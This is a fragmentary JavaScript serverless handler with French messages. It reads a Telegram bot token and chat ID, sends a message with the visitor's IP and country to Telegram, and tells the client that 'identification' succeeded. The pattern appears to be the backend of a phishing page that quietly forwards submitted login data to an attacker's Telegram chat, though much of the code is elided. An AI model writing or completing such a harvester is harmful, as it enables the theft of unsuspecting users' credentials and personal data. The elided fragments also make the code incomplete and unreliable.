export default async function handler(req, res) {
  ...
  try {
    ...
    const botToken = process.env.BOT_TOKEN1;
    const chatId = process.env.CHAT_ID1;
...
🌍 IP: ${ip} (${country})`;
    ...
    if (!telegramResponse.ok) {
      ...
      return res.status(502).json({ error: "Échec d'identification", details: text });
    }

    // Réponse au client
    return res.status(200).json({ success: true, message: "Identification réussi" });
